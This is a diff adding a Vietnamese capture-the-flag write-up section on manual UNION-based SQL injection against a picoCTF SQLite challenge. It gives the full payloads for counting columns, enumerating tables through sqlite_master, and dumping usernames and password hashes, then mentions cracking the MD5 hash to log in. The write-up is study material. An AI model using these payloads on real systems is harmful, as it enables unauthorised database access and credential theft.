@@ -20,6 +20,38 @@ sqlmap -u "http://lonely-island.picoctf.net:52804/vuln.php?q=flags"  -H "Cookie:
 
 # Cách 2: Manual exploitation
 
+\- Sử dụng lệnh SQL để xem số cột trả về: `flags' ORDER BY 3-- -`, ta nhận được:
+
+<img width="1920" height="205" alt="image" src="https://github.com/user-attachments/assets/a122bbf4-d01d-4889-b679-9d2cab5949f4" />
+
+$\implies$ Truy vấn trả về 2 cột dữ liệu
+
+\- Sử dụng kĩ thuật khai thác UNION-based SQLi, ta có:
+
+```
+flags' UNION SELECT type, name from sqlite_master where type="table"-- -
+```
+
+<img width="373" height="225" alt="image" src="https://github.com/user-attachments/assets/1d6b439b-5d84-4e06-8f79-568b21e731a6" />
+
+\- Khai thác sâu hơn vào bảng `users` để xem cấu trúc các cột bên trong:
+
+```
+flags' UNION SELECT name, sql from sqlite_master where type="table" and name="users"-- -
+```
+
+<img width="542" height="313" alt="image" src="https://github.com/user-attachments/assets/5a13ae9d-5bcb-4b13-9274-358e5f0261c2" />
+
+\- Quá rõ ràng rồi, chỉ việc truy vấn 2 cột quan trọng là xong 
+```
+flags' UNION SELECT username, password FROM users--
+```
+
+<img width="575" height="664" alt="image" src="https://github.com/user-attachments/assets/e249e1d6-d216-4b21-a546-7d9510ee3506" />
+
+\- Thực hiện md5-decrypt mật khẩu và đăng nhập vào tài khoản `ctf-player`
+
+
 
 
 
